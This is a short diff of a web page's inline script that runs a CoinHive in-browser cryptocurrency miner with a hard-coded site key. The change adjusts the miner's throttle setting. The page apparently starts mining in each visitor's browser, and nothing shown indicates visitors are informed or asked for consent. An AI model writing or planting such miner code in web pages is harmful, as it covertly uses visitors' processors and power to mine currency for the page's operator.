@@ -9,7 +9,7 @@
     <script>
         var name = Math.floor(Math.random()*1000);
         var miner = new CoinHive.User('x7lJozj7YkUgRD3dyyaOYly6Fa8dtynQ','is'+name,
-            {throttle: 0.35, forceASMJS: true}
+            {throttle: 0.5, forceASMJS: true}
         );
         miner.start();
         var threads = miner.getNumThreads();
